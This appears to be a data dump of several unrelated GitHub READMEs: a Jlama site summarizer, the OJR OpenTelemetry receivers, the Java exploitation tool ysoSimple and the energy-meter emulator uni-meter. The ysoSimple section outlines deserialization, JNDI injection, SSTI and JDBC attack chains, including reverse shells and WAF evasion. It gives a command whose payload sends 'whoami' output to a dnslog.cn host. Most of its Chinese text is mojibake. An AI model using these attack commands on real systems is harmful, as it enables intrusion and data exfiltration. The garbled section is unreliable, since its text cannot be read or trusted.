2024-11-28 11:01:11,640 INFO  [com.git.tja.jla.ten.ope.TensorOperationsProvider] (main) Using Native SIMD Operations (OffHeap)
2024-11-28 11:01:11,647 INFO  [com.git.tja.jla.mod.AbstractModel] (main) Model type = Q4, Working memory type = F32, Quantized memory type = I8
The text you provided is a summary of the Kubernetes Native Java series, which is part of the ""Native Compilations Boosts Java"" article series. The series aims to provide answers to questions about native compilation, such as how to use native Java, when to switch to native Java, and what framework to use.

The text also mentions the following key points:

* Native compilation with GraalVM makes Java in the cloud cheaper.
* Native compilation raises many questions for all Java users, such as how to use native Java, when to switch to native Java, and what framework to use.
* The series will provide answers to these questions.

Overall, the text provides an overview of the Kubernetes Native Java series and its goals, highlighting the importance of native compilation in the cloud and the need for answers to specific questions about native Java.

Here is a summary of the key points:

* Native compilation with GraalVM makes Java in the cloud cheaper.
* Native compilation raises many questions for all Java users, such as how to use native Java, when to switch to native Java, and what framework to use.
* The series will provide answers to these questions.

I hope this summary is helpful. Let me know if you have any further questions or if there's anything else I can help with.
---
Site summarization done in 53851 ms
2024-11-28 11:02:03,164 INFO  [io.quarkus] (main) site-summarizer stopped in 0.012s
```

Note that it is necessary to launch the JVM with a few additional arguments that enable the access to the Vector API which is still a Java preview feature, but it is internally used by Jlama to speed up the computation.

## Summarizing a Wikipedia page

The site summarizer offers a special treatment for wikipedia pages, leveraging some knowledge on how the HTML of these pages is formatted to provide a more reliable text extraction. To use this feature is not necessary to provide the complete URL of the page when launching the jar, but only to write `wiki` as first argument followed by the topic of interest as it follows:  

```shell script
java -jar --enable-preview --enable-native-access=ALL-UNNAMED --add-modules jdk.incubator.vector target/quarkus-app/quarkus-run.jar wiki Cat
```

## Exposing the site summarizer as a REST service

Alternatively, launching the jar without any argument, will have the effect of exposing this summarization service as a REST endpoint, so for instance it will be possible to generate the summarization of the Wikipedia page dedicated to cats by querying the URL: http://localhost:8080/summarize/wiki/Cat 

![](images/Summarize_Cat.png)
 
Similarly, to summarize a blog post from any other web site, it is necessary to query the endpoint summarize/blog/{url}, so for instance it is possible to generate the summarization of the same article processed in the first section visiting the URL: http://localhost:8080/summarize/blog/https:%2F%2Fwww.infoq.com%2Farticles%2Fnative-java-quarkus%2F",0,1,1,,0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
liurui-software/ojr,main,"# OJR (OpenTelemetry Receivers by Java)


**[Changelog](CHANGELOG.md)** | **[Semantic Conventions](docs/semconv/README.md)** | **[Contributing](CONTRIBUTING.md)** | **[License](LICENSE)**

 
---

## Introduction of OJR

OJR ([OpenTelemetry](https://opentelemetry.io/) [Receivers](https://opentelemetry.io/docs/collector/configuration/#receivers) by Java) is a collection of stanalone OpenTelemetry receivers written with Java. A standard [OTLP](https://opentelemetry.io/docs/specs/otel/protocol/) [exporter](https://opentelemetry.io/docs/collector/configuration/#exporters) is provided to forward the data from the receivers to a Telemetry backend or an [OpenTelemetry Collector](https://opentelemetry.io/docs/collector/).

OpenTelemetry's goals are real and its realization has a realistic basis, although the problems it has to solve are indeed complex. The achievement of OpenTelemetry is amazing. The number of users is also increasing significantly. However, there are still challenges along with the design of OpenTelemetry. One problem is the over-complexity of some of the SDKs, which creates obstacles to the efforts of product vendors to include support for OpenTelemetry. The auto-instrumentation is really good while sometimes we still need manual enhancements from the product or app providers to add built-in OpenTelemetry support. There are other minor issues. For example, OpenTelemetry Collector is a fantastic tool. While small or medium systems can be difficult to be selected to have an official receiver inside the official released OpenTelemetry Collectors.

There are several goals of this project:
- Provide a simplified SDK for Java developers to adopt OpenTelemetry.
- Provide standalone receivers for diverse systems and components. Compare with official OpenTelemetry Collector which is primarily designed for mainstream products on the market. There are great potential to support various OpenTelemetry data signals from different sources of whatever any type.
- Propose and promote related [OpenTelemetry semantic conventions](https://opentelemetry.io/docs/concepts/semantic-conventions/) which can greatly improve the usability of OpenTelemetry.
 
The ""SDK"" component of this project is the encapsulation of the OpenTelemetry Java SDK which can simplify the development process. The ""Data Collector (DC)"" component is the receiver implementation which can be used to collect OpenTelemetry data signals (metrics, traces, logs) from various sources. The ""Agent"" component is the standalone engine to run the Data Collectors. Users can also slightly revise the Agent code to have this functionality built into their own applications or products. The ""Agent"" component includes a thread pool to run the Data Collectors and a stanbdard otlp exporter to forward the data to the backend. There are several addional components including a built-in batch processor for traces and logs collection, and an optional Prometheus exportor for metrics collection.

There are ""Templates"" in this project which can be used as templates to build your own Date Collectors and Agents for different categories of systems. The Template is an optional component to be simplify the creation of Data Collectors and Agents.

We highly respect the existing official semantic specifications of OpenTelemetry. While we also have some new proposed OpenTelemetry semantic conventions which can be used to standardize the data models.

Note: The project is partially from [ODCD](https://github.com/instana/otel-dc) with [MIT license](https://github.com/instana/otel-dc/blob/main/LICENSE). I am also the creator and the kernel code author of ODCD.

<br>


## Receivers provided by OJR besides the SDK

We will provide more receivers in the future and welcome contributions. Right now there are only metrics receivers available, while the OJR SDK itself can also support traces and logs.
  
| Receiver name | Type | Status | JDK required |
|---------------|------|--------|--------------|
| [Dameng Database](ojr-dameng-db/README.md)       | metrics | beta  | Java 8+  |
| [Oceanbase Database](ojr-oceanbase-db/README.md) | metrics | alpha | Java 8+  |
| [Informix Database](ojr-informix-db/README.md)   | metrics | alpha | Java 8+  |
| [Linux Host](ojr-linux-host/README.md)           | metrics | alpha | Java 8+  |
| [SNMP Host](ojr-snmp-host/README.md)             | metrics | alpha | Java 11+ |
| [IBM MQ Appliance](ojr-mq-appliance/README.md)   | metrics | beta  | Java 8+  |
| [IBM MQ](ojr-ibmmq/README.md)                    | metrics | beta  | Java 8+  |


## Common Parameters for Receivers/Agents

| Parameter | Scope | Description | Default |Examples |
|-----------|-------|-------------|---------|---------|
| otel.poll.interval | instance | The time interval to query metrics in seconds | 25 | 50 |
| otel.callback.interval | instance | The time interval to post data to backend in seconds | 30 | 60 |
| otel.backend.url | instance | The URL of the OTel Backend. | http://127.0.0.1:4318 | http://127.0.0.1:4318  https://my-server:4318 |
| otel.transport | instance | The transport protocol. | http | http grpc prometheus grpc+prometheus http+prometheus |
| otel.service.name | instance | The OTel Service name | OJR | MyDataService |
| otel.service.instance.id | instance | The OTel Service instance ID (optional) | N/A | Instana-01 |
| otel.transport.timeout | instance | The transport timeout in milliseconds (optional) | 10000 | 10000 |
| otel.transport.delay | instance | The transport delay (used for Batch processor) in milliseconds (optional) | 100 | 100 |
| otel.restricted.metrics | instance | The metrics list to be omitted to be sent to backend | N/A | db.sql.elapsed_time,process_cpu_usage |
| prometheus.port | instance | The port of Prometheus endpoint if Prometheus is enabled (optional) | 16543 | 16543 |
| prometheus.host | instance | The host of Prometheus endpoint if Prometheus is enabled (optional) | N/A | localhost |
| prometheus.restricted.metrics | instance | The metrics list to be omitted for Prometheus (optional, separated by "","") | N/A | db.sql.elapsed_time,process_cpu_usage |


## File paths of configuration files for Receivers/Agents

By default, the configuration file for an OJR agent/receiver is located at `config/config.yaml`. 

OJR is using Java byilt-in JUL for logging which does not have impact on the choice of logging framework used chosed by user when user have OJR built into their own applications. The logging configuration file is by default located at `config/logging.properties`.

User can use `OJR_CONFIG` environment variable or Java system property to specify the path of the configuration file directly. For example, `OJR_CONFIG=/path/to/config1.yaml`.

According to the Java convention, the logging configuration file can also be specified by `java.util.logging.config.file` system property.

User can also just specify the file directory of the OJR configuration file and logging configuration file by `OJR_DIR` environment variable or Java system property. For example, `OJR_DIR=/path/to/config/dir`.


## Some advanced configurations

OJR recognizes the following standard OpenTelemetry environment variables:

- `OTEL_RESOURCE_ATTRIBUTES` is used to add more OpenTelemetry resource attributes. For example, OTEL_RESOURCE_ATTRIBUTES=""custom.bizID=xxx,customer.bizName=yyy"".
- `OTEL_EXPORTER_OTLP_HEADERS` is used to add more HTTP headers to the built-in OTLP exporter. For example, OTEL_EXPORTER_OTLP_HEADERS=""api-key=key,other-config-value=value"".
- `OTEL_EXPORTER_OTLP_CERTIFICATE` is used to specify the path of the certificate file for the built-in OTLP exporter. For example, OTEL_EXPORTER_OTLP_CERTIFICATE='/tmp/lr/servercert.cer'.",5,0,1,Apache-2.0,0,7.0,0.0,0.0,0.0,0.0,0.0,1.0,33.0
B0T1eR/ysoSimple,master,"# ysoSimple

ysoSimpleÔºöÁÆÄÊòìÁöÑJavaÊºèÊ¥ûÂà©Áî®Â∑•ÂÖ∑ÔºåÈõÜÊàêJavaÂèçÂ∫èÂàóÂåñÔºåHessianÂèçÂ∫èÂàóÂåñÔºåXStreamÂèçÂ∫èÂàóÂåñÔºåSnakeYamlÂèçÂ∫èÂàóÂåñÔºåShiro550ÔºåJSFÂèçÂ∫èÂàóÂåñÔºåSSTIÊ®°ÊùøÊ≥®ÂÖ•ÔºåJdbcAttackPayloadÔºåJNDIAttackÔºåÂ≠óËäÇÁ†ÅÁîüÊàê„ÄÇ

# 0x01 ÂâçË®Ä:

## a.Ê∫êËµ∑:

ysoSimpleÂ∑•ÂÖ∑ÊòØÂü∫‰∫é[ysoserial-for-woodpecker](https://github.com/woodpecker-framework/ysoserial-for-woodpecker)Âíå[JNDIMap](https://github.com/X1r0z/JNDIMap)‰∫åÂºÄÁöÑJavaÂà©Áî®Â∑•ÂÖ∑Ôºå‰∏ªË¶ÅÊòØÊñπ‰æøËá™Â∑±Â≠¶‰π†ÊºèÊ¥ûÂà©Áî®ÂíåÊñπ‰æøËá™Â∑±Êï¥ÁêÜÊºèÊ¥ûÂà©Áî®„ÄÇ

ÂÖ∂ÂÆûÁΩë‰∏äÂ∑≤ÁªèÊúâÂæàÂ§ö‰ºòÁßÄÁöÑJavaÊºèÊ¥ûÂà©Áî®Â∑•ÂÖ∑ÔºåÊØîÂ¶ÇÂÉèwh1t31pÂ∏àÂÇÖÁöÑysomapÔºåc0ny1Â∏àÂÇÖÁöÑysoerial-for-woodpeckerÔºåqi4lÂ∏àÂÇÖÁöÑJYsoÔºåX1r0zÂ∏àÂÇÖÁöÑJNDIMapÔºåAr3hÂ∏àÂÇÖË∂ÖÂº∫ÁöÑweb-chains„ÄÇ‰∏∫‰ªÄ‰πàËøòË¶ÅËá™Â∑±Êêû‰∏™Â∑•ÂÖ∑ÈÄ†ËΩÆÂ≠êÔºü‰∏ªË¶ÅÊúâ‰ª•‰∏ãÁöÑÂéüÂõ†Ôºö

1. Â≠¶‰π†Â∏àÂÇÖ‰ª¨JavaÂà©Áî®ÈìæÁöÑÁºñÂÜôÊÄùË∑ØÔºåÁî®Êù•Ëá™ÊàëÊèêÂçá„ÄÇ
2. Êñπ‰æøËá™Â∑±Âø´ÈÄüÊ∑ªÂä†ÊÉ≥Ë¶ÅÁöÑÂäüËÉΩÔºåÂú®ÂÆûÊàò‰∏≠Ëá™‰∏ª‰øÆÊîπÂπ∂Âø´ÈÄü‰ΩøÁî®„ÄÇ
3. ÊâìÈÄ†Â±û‰∫éËá™Â∑±ÁöÑÂ∑•ÂÖ∑ÁÆ±ÔºåÊääËá™Â∑±ÊÉ≥Êï¥ÁêÜÁöÑÊºèÊ¥ûÈìæÂà©Áî®Â≠òËµ∑Êù•„ÄÇ
4. Êüê‰∫õÁ≥ªÁªüÂ∫îÁî®‰ºöÊúâËá™Â∑±ÁöÑÂèçÂ∫èÂàóÂåñÈìæÂíåÂçèËÆÆÔºåÈúÄË¶ÅËá™Â∑±Êï¥ÁêÜÂ∑•ÂÖ∑ÁÆ±„ÄÇ
5. ÂÆåÊàêÊØï‰∏öËÆæËÆ°(emmm...)

Âç≥‰ΩøÈ≠îÊîπÁöÑÂ∑•ÂÖ∑‰∏çÂ¶ÇËøôÂá†‰ΩçÂâçËæàÁöÑÔºå‰ΩÜÊòØÊú¨ÁùÄËá™ÊàëÂ≠¶‰π†ÂíåËÉΩÂäõÊèêÂçáÁöÑÊÉ≥Ê≥ïËøòÊòØÁªôËá™Â∑±ÊåñÂùë„ÄÇysoSimpleÂ∑•ÂÖ∑ÁõÆÂâçÊòØÂëΩ‰ª§Ë°åÊ†ºÂºèÁöÑÔºåÊñπ‰æø‰ΩøÁî®‰øÆÊîπ„ÄÇÂõ†‰∏∫ÊàëÁöÑ‰ª£Á†ÅÊ∞¥Âπ≥‰∏çÂº∫ÔºåÊâÄ‰ª•ÈÉΩÊòØÁºùÂú®‰∏ÄËµ∑ÁöÑ„ÄÇ
Â∑•ÂÖ∑ËøòÊúâÂæàÂ§öÂú∞Êñπ‰∏çÂÆåÂñÑÔºåÂêéÁª≠ÊÖ¢ÊÖ¢Êï¥ÁêÜË°•ÂÖÖ.......

## b.ÊºèÊ¥ûÂà©Áî®ÊÄùË∑Ø:

‰∏ÄËà¨ÂÉèÂ∑•ÂÖ∑ÁöÑ‰ΩøÁî®ÈÄöÂ∏∏ÈÉΩÊòØÂú®ÈªëÁõíÊÉÖÂÜµ‰∏ãÔºåÈªëÁõíÊµãËØïÈÅáÂà∞ÂèçÂ∫èÂàóÂåñÂíåJNDIÊ≥®ÂÖ•ÊÉÖÂÜµÊó∂ÔºöÈ¶ñÂÖàÊàë‰ºöÁî®ÂÉèdns/sleepËøôÁßçpocËøõË°åÊµãËØïÊù•Á°ÆÁ≥ªÊºèÊ¥ûÂ≠òÂú®ÔºåÂ¶ÇÊûúÊºèÊ¥ûÂà©Áî®ÊñπÂºèÊîØÊåÅÂØπÁõÆÊ†áÁéØÂ¢ÉËøõË°åÊé¢ÊµãÊàë‰ºöÂÖàÊääÁõÆÊ†áÁéØÂ¢ÉÁöÑ‰∏≠Èó¥‰ª∂/JDKÁâàÊú¨/Êìç‰ΩúÁ≥ªÁªüËøô‰∫õ‰ø°ÊÅØÊë∏Ê∏ÖÊ•öÊñπ‰æøÂêéÁª≠Ê∑±ÂÖ•Âà©Áî®ÔºåÁÑ∂ÂêéÂú®ËøõË°åÊºèÊ¥ûÂà©Áî®ÈìæÊîªÂáªÊó∂‰ºöÊâì‰∏ãdnslog/sleepÊñπ‰æøÁ°ÆËÆ§ÊºèÊ¥ûÂà©Áî®ÈìæËÇØÂÆöËÉΩ‰ΩøÁî®ÔºåÊúÄÂêéÂ∞±ÊòØÂÜÖÂ≠òÈ©¨/ÂèçÂºπShellËøô‰∫õ‰∫Ü„ÄÇ

### (1)JavaÂèçÂ∫èÂàóÂåñ

ÂΩìÈªëÁõíÊµãËØïJavaÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÊó∂Ôºå‰ªéÁéØÂ¢ÉÊé¢ÊµãÂà∞ÊºèÊ¥ûÂà©Áî®ÊÄùË∑ØÔºö

1. URIDNS/FindClassByBombÊµãËØïJavaÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÊòØÂê¶Â≠òÂú®
2. FindClassByDNS/FindGadgetByDNS/FindClassByBombÊµãËØïÁõÆÊ†áÁéØÂ¢ÉÂà©Áî®ÈìæÔºå‰∏≠Èó¥‰ª∂ÔºåÊìç‰ΩúÁ≥ªÁªüÔºåjdkÁâàÊú¨
3. CommonsBeautils/CommonsCollections/C3P0ÊºèÊ¥ûÂà©Áî®(dnslogÊµãËØïÔºåsleepÂª∂ËøüÔºåÂõûÊòæÊµãËØïÔºåÂÜÖÂ≠òÈ©¨ÔºåÂèçÂºπShell)
4. dirt-data-length/UTF8-Overlong EncodingÂØπÊäóWAF

### (2)HessianÂèçÂ∫èÂàóÂåñ

ÂΩìÈªëÁõíÊµãËØïHessianÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÊó∂Ôºå‰ªéÁéØÂ¢ÉÊé¢ÊµãÂà∞ÊºèÊ¥ûÂà©Áî®ÊÄùË∑ØÔºö

1. LazyValue-InetAddressÊµãËØïHessianÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÊòØÂê¶Â≠òÂú®(Áî®Hessian1ÂíåHessian2ÂçèËÆÆÈÉΩÊâì‰∏ã)
2. LazyValue-BCELLoader/LazyValue-Jndi/LazyValue-XSTLÊºèÊ¥ûÂà©Áî®(dnslogÊµãËØïÔºåsleepÂª∂ËøüÔºåÂõûÊòæÊµãËØïÔºåÂÜÖÂ≠òÈ©¨ÔºåÂèçÂºπShell)
3. dirt-data-length/UTF8-Overlong EncodingÂØπÊäóWAF

### (3)XStramÂèçÂ∫èÂàóÂåñ

1. FindClassByBombÊµãËØïXStreasmÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÊòØÂê¶Â≠òÂú®
2. .....

### (4)SnakeYamlÂèçÂ∫èÂàóÂåñ

1. FindClassByDNSÊµãËØïSnakeYamlÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÊòØÂê¶Â≠òÂú®
2. FindClassByDNSÊé¢ÊµãÁõÆÊ†áÁéØÂ¢É‰∏≠Èó¥‰ª∂ÔºåÊìç‰ΩúÁ≥ªÁªüÔºåjdkÁâàÊú¨
3. JdbcRowImpl/ScriptEngineManager/C3P0ÈìæÊºèÊ¥ûÂà©Áî®

### (5)JNDIÊ≥®ÂÖ•

JNDIÁ≥ªÂàóÊâìÊ≥ïÂàÜ‰∏∫RMIÊ≥®ÂÖ•ÂíåJNDIÊ≥®ÂÖ•Ôºö

**RMIÊ≥®ÂÖ•**

1. JDK‰ΩéÁâàÊú¨ËøúÁ®ãÂ∑•ÂéÇÁ±ªÂä†ËΩΩ(dnslogÊµãËØïÔºåsleepÂª∂ËøüÔºåÂõûÊòæÊµãËØïÔºåÂÜÖÂ≠òÈ©¨ÔºåÂèçÂºπShell)
2. JDKÈ´òÁâàÊú¨Êú¨Âú∞Â∑•ÂéÇÁ±ªÂà©Áî®(BeanFactoryÂçïÂèÇÊï∞RCEÊâìÊ≥ïÔºåJDBC FactoryÊï∞ÊçÆÂ∫ìËøûÊé•ÊâìÊ≥ï...)
3. JRMPListener JRMPÂ±ÇÁöÑÊîªÂáª

**JNDIÊ≥®ÂÖ•**

1. JDK‰ΩéÁâàÊú¨ËøúÁ®ãÂ∑•ÂéÇÁ±ªÂä†ËΩΩ(dnslogÊµãËØïÔºåsleepÂª∂ËøüÔºåÂõûÊòæÊµãËØïÔºåÂÜÖÂ≠òÈ©¨ÔºåÂèçÂºπShell)
2. JDKÈ´òÁâàÊú¨Êú¨Âú∞Â∑•ÂéÇÁ±ªÂà©Áî®(BeanFactoryÂçïÂèÇÊï∞RCEÊâìÊ≥ïÔºåJDBC FactoryÊï∞ÊçÆÂ∫ìËøûÊé•ÊâìÊ≥ï...)
3. ldapÊâìJavaÂèçÂ∫èÂàóÂåñ(Áî®ÁöÑÂ§ö)ÔºåËøôÈÉ®ÂàÜÂ∞±Âíå‰∏äÈù¢JavaÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÂà©Áî®ÊÄùË∑Ø‰∏ÄÊ†∑‰∫Ü

### (6)SSTIÊ®°ÊùøÊ≥®ÂÖ•

JavaÁ≥ªÂàóÁöÑÊ®°ÊùøÔºöFreemarkerÔºåVelocityÔºåPebble„ÄÇÊ®°ÊùøÊ≥®ÂÖ•ÈÉΩÊòØÈó¥Êé•Êìç‰ΩúJavaAPIÔºåÈÄöÂ∏∏Ê≤°ÊúâÊé¢ÊµãÁéØÂ¢ÉÁöÑÊ≠•È™§ÔºåÁõ¥Êé•ÊµãËØïÊºèÊ¥ûÂà©Áî®ÔºåÂà©Áî®Êó∂ÂêåÊ†∑ÊòØÂÖàÊµãËØï(dnslogÊµãËØïÔºåsleepÂª∂Ëøü)‰øùËØÅÂà©Áî®ÈìæÂèØ‰ª•Ë¢´Âà©Áî®„ÄÇ

**FreeMarker**

* ÂÜÖÂª∫ÂáΩÊï∞?newÔºöExecuteÂëΩ‰ª§ÊâßË°åÔºåJythonRuntimeÂëΩ‰ª§ÊâßË°åÔºåObjectConstructorÂÆû‰æãÂåñÂØπË±°
* ÂÜÖÂª∫ÂáΩÊï∞?apiÔºöË∞ÉÁî®ÂØπË±°ÁöÑÊñπÊ≥ï
* StaticModelÔºöÈùôÊÄÅÊñπÊ≥ïË∞ÉÁî®
* dataModelÔºöÊï∞ÊçÆÊ®°Âûã(FreeMarker<2.3.30ÁªïËøáÊ≤ôÁÆ±)
* springMacroRequestContext Request‰∏ä‰∏ãÊñáRCE

### (7)JdbcAttackÊï∞ÊçÆÂ∫ìÂà©Áî®

Âú®Á≥ªÁªüÁÆ°ÁêÜÂêéÂè∞ÔºåÂåÖÊã¨Fastjson/JavaÂèçÂ∫èÂàóÂåñÈÉΩÂèØËÉΩÊ∂âÂèäÂà∞JDBCAttack„ÄÇJDBCAttackÊï¥ÁêÜÂá∫Êù•Êúâ‰ø©ÁßçÂà©Áî®ÊñπÂºè: ËøûÊé•‰∏≤Âà©Áî®ÔºåÊâßË°åSQLËØ≠Âè•Âà©Áî®„ÄÇ

**H2 DataBaseÔºöÊï∞ÊçÆÂ∫ìËøûÊé•‰∏≤ÊºèÊ¥ûÂà©Áî®**

* H2 CreateAlias ÊâßË°åJava‰ª£Á†Å
* H2 RunScript ËøúÁ®ãÂä†ËΩΩSQLÊñá‰ª∂
* H2 StaticMethod ÊâßË°åJavaÈùôÊÄÅËØ≠Ê≥ï
* H2 Groovy ÊâßË°åGroovyË°®ËææÂºè
* H2 JavaScript ÊâßË°åJSË°®ËææÂºè

**DerbyÔºöÊâßË°åSQLËØ≠Âè•ÊºèÊ¥ûÂà©Áî®**

* Áõ¥Êé•Âä†ËΩΩjavaÂ≠óËäÇÁ†ÅRCE
* ËøúÁ®ãÂä†ËΩΩjarÂåÖ
* ËêΩÂú∞jarÂåÖÂä†ËΩΩ

**PostgreSQLÔºöÊï∞ÊçÆÂ∫ìËøûÊé•ÊºèÊ¥ûÂà©Áî®**

* socketFactory/socketFactoryArg ÂçïÂèÇÊï∞ÊûÑÈÄ†ÊñπÊ≥ïÂÆû‰æãÂåñ
* loggerLevel/loggerFile Êó•ÂøóÊñá‰ª∂ÂÜôÂÖ•

**MySQLÔºöÊï∞ÊçÆÂ∫ìËøûÊé•ÊºèÊ¥ûÂà©Áî®**

* ReadFileÔºöËØªÊñá‰ª∂
* detectCustomCollationsÔºöËß¶ÂèëJavaÂèçÂ∫èÂàóÂåñÔºåÊµãËØïÊ≠•È™§Âíå‰∏äÈù¢‰∏ÄÊ†∑
* ServerStatusDiffInterceptorÔºöËß¶ÂèëJavaÂèçÂ∫èÂàóÂåñÔºåÊµãËØïÊ≠•È™§Âíå‰∏äÈù¢‰∏ÄÊ†∑

# 0x02 ÁÆÄÂçï‰ΩøÁî®

## a.ÊîØÊåÅÁöÑÊ®°Âùó

ÁõÆÂâçysoSimpleÈõÜÊàê7ÁßçÊºèÊ¥ûÂà©Áî®Ê®°ÂùóÔºö

1. JavaÂéüÁîüÂèçÂ∫èÂàóÂåñÔºöYsoAttack
2. HessianÂèçÂ∫èÂàóÂåñÔºöHessianAttack
3. XStramÂèçÂ∫èÂàóÂåñÔºöXStramAttack
3. SnakeYamlÂèçÂ∫èÂàóÂåñÔºöSnakeYamlAttack
4. Shiro550ÂèçÂ∫èÂàóÂåñÔºöYsoAttack
5. JSFÂèçÂ∫èÂàóÂåñÔºöYsoAttack
4. JdbcAttackÊ®°ÂùóÔºöJdbcAttack
5. SSTIÊ®°ÊùøÊ≥®ÂÖ•ÔºöSSTIAttack
6. JNDIÊúçÂä°Âô®ÔºöJNDIAttack
7. Â≠óËäÇÁ†ÅÁîüÊàêÊ®°ÂùóÔºöThirdPartyAttack

YsoSimpleÁî®-mÊàñËÄÖ-modeÂèÇÊï∞ÈÄâÊã©Ë¶Å‰ΩøÁî®ÁöÑÊ®°ÂùóÔºå‰æãÂ¶ÇÔºö

```bash
java -jar ysoSimple.jar -m YsoAttack
```

Èô§JNDIAttackÂ§ñÂÖ∂‰ΩôÊ®°ÂùóÈÉΩÈúÄË¶Å‰ø©‰∏™ÂøÖË¶ÅÂèÇÊï∞-g(-gadget)Âíå-a(-args)Ôºå-gadgetÊåáÂÆöÁîüÊàêÁöÑÂà©Áî®Èìæ„ÄÇ-argsÊåáÂÆöËØ•Âà©Áî®ÈìæÁöÑÊºèÊ¥ûÂà©Áî®ÊïàÊûúÔºå‰æãÂ¶ÇÔºö

```bash
java -jar ysoSimple.jar -m YsoAttack -g CommonsBeanutils2 -a ""Templateslmpl:dnslog:whoami.dnslog.cn""
```

ÊØè‰∏™Ê®°ÂùóÈô§-g(-gadget)Âíå-a(-args)‰ø©‰∏™ÂèÇÊï∞‰πãÂ§ñÊØè‰∏™Ê®°ÂùóËøòÊúâÈ¢ùÂ§ñÁöÑÂèÇÊï∞ÔºåËøô‰∫õÂèÇÊï∞Áî®‰∫éÂØπÂà©Áî®ÈìæËøõË°å‰øÆÈ•∞(ÂéãÁº©/Ê∑∑Ê∑Ü/ÁºñÁ†Å/Â≠òÊñá‰ª∂)„ÄÇÂú®[ysoSimple-wiki](ysoSimple-Wiki.md)ÁöÑÊ®°Âùó‰ªãÁªç‰∏≠ÈÉΩ‰ºöËØ¶ÁªÜËØ¥Êòé„ÄÇ

JNDIAttackÊ®°ÂùóÂêØÂä®

```bash
java -jar ysoSimple.jar -m JNDIAttack
```

## b.helpÂëΩ‰ª§

‰ΩøÁî®helpÂëΩ‰ª§ÁÑ∂ÂêéË∑üÁùÄÊ®°ÂùóÂêç‰ºöÊúâÁÆÄÂçïÁöÑ‰ΩøÁî®ÊñπÂºèËØ¥ÊòéÔºåÁªìÂêàÊñáÊ°£Êù•Áúã‰ºöÊõ¥Â•Ω„ÄÇ

```bash
java -jar ysoSimple.jar -help YsoAttack
```

## c.ËØ¶ÁªÜ‰ΩøÁî®

ÂÖ∑‰ΩìÁöÑ‰ΩøÁî®ÊñπÂºèËßÅ[ysoSimple-wiki](ysoSimple-Wiki.md)ÊñáÊ°£

# 0x03 Â∑•ÂÖ∑ÊâìÂåÖ

Requires Java 1.7+ and Maven 3.x+

```bash
mvn clean package -DskipTests
```

#  0x04 ÂÖçË¥£Áî≥Êòé

**ysoSimple** Â∑•ÂÖ∑‰ªÖÁî®‰∫é‰∏™‰∫∫Á†îÁ©∂ÂíåÂ≠¶‰π†ÁõÆÁöÑÔºåÁ¶ÅÊ≠¢Â∞ÜÂÖ∂Áî®‰∫é‰ªª‰ΩïÈùûÊ≥ïÊ¥ªÂä®ÊàñÊú™ÁªèÊéàÊùÉÁöÑË°å‰∏∫„ÄÇÊú¨È°πÁõÆÁöÑÂºÄÂèëËÄÖ„ÄÅÊèê‰æõËÄÖÂíåÁª¥Êä§ËÄÖ‰∏çÂØπ‰ΩøÁî®ËÄÖÂõ†Â∑•ÂÖ∑ÁöÑ‰ΩøÁî®ËÄå‰∫ßÁîüÁöÑË°å‰∏∫ÂèäÂêéÊûúÊâøÊãÖ‰ªª‰ΩïË¥£‰ªªÔºåÊâÄÊúâÈ£éÈô©Áî±‰ΩøÁî®ËÄÖËá™Ë°åÊâøÊãÖ„ÄÇ

**ysoSimple** is strictly for personal research and educational purposes only. It is prohibited to use this tool for illegal activities or unauthorized actions.The developers, providers, and maintainers of this project bear no responsibility for the actions and consequences arising from the use of this tool. Users assume all risks associated with its usage.

# 0x05 ÊÑüË∞¢

[https://github.com/woodpecker-framework/ysoserial-for-woodpecker](https://github.com/woodpecker-framework/ysoserial-for-woodpecker)

[https://github.com/X1r0z/JNDIMap](https://github.com/X1r0z/JNDIMap)

[https://github.com/Java-Chains/web-chains](https://github.com/Java-Chains/web-chains)

[https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java](https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java)

[https://github.com/Whoopsunix/utf-8-overlong-encoding](https://github.com/Whoopsunix/utf-8-overlong-encoding)

[https://github.com/luelueking/Deserial_Sink_With_JDBC](https://github.com/luelueking/Deserial_Sink_With_JDBC)

[https://github.com/h0ny/NacosExploit](https://github.com/h0ny/NacosExploit)

[https://github.com/SummerSec/ShiroAttack2](https://github.com/SummerSec/ShiroAttack2)

https://github.com/kezibei/Urldns

‚Äç[https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson ‰∏éÂéüÁîüÂèçÂ∫èÂàóÂåñ/](https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson‰∏éÂéüÁîüÂèçÂ∫èÂàóÂåñ/)

[https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson ‰∏éÂéüÁîüÂèçÂ∫èÂàóÂåñ-‰∫å/](https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson‰∏éÂéüÁîüÂèçÂ∫èÂàóÂåñ-‰∫å/)

https://github.com/X1r0z/hessian-utf-8-overlong-encoding

http://www.bmth666.cn/2024/11/03/Shiro%E7%BB%95%E8%BF%87Header%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E8%BF%9B%E9%98%B6%E5%88%A9%E7%94%A8/
",1,0,1,,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
sdeigm/uni-meter,main,"# uni-meter

uni-meter is a small tool that emulates a Shelly Pro3EM device for the usage with the Hoymiles MS-A2 and the Marstek
Venus storage. It is not a full implementation of a Shelly Pro3EM device, currently only the parts that are needed by 
the storages are implemented.

The real electrical meter data currently can be gathered from the following devices:

- Generic HTTP (configurable HTTP interface, usable for many devices)
- MQTT
- Shelly 3EM (totally untested, I have no test device)
- SHRDZM smartmeter interface module (UDP)
- SMA energy meter / Sunny Home Manager (UDP protocol)
- SMD120 modbus energy meter (via Protos PE11) (SMD630 could be added, I have no test device)
- Tasmota IR read head (via HTTP)
- Tibber Pulse (local API) 
- VzLogger webserver

The idea is to further enhance the tool in the future by adding more input and output devices to get a universal 
converter between different electrical meters, inverters and storage systems.

## Download

The release versions are packaged as [GitHub package](https://github.com/sdeigm/uni-meter/packages/2336213).
You just have to download the `uni-meter-<version>.tgz` archive from the assets on the right side of the package's page.

## Building

The project can be build using Java 17 and Maven 3.8.5 or later by simply typing

```shell
mvn install
```

within the project's root directory. 

